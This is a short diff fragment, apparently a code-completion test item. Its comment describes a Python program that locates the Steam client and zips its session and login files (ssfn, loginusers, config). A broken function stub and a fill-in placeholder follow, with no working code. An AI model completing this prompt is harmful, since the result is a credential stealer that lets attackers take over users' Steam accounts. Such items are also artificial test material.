@@ -1,0 +1,2 @@
+\n # A Python program to find a process named "Steam" to locate the path of the Steam client; Collect specific files, including files such as "ssfn *", "config \ loginusers.", and "config \ config.". Then, it compresses these files into an archive file called "steam. zip". \n  def SteamProcessLocator("**
+ <FILL_HERE>
